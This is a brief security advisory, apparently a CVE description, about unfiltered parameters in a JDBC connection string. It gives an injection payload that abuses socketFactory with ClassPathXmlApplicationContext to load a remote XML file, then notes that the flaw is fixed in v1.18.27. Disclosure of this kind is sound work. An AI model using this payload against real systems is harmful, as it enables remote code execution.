When constructing the jdbc connection string, the parameters are not filtered. Constructing the host as ip5432/test/?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http//ip5432/1.xml&a= can trigger the ClassPathXmlApplicationContext construction method. The vulnerability has been fixed in v1.18.27. Users are advised to upgrade. There are no known workarounds for this vulnerability.",
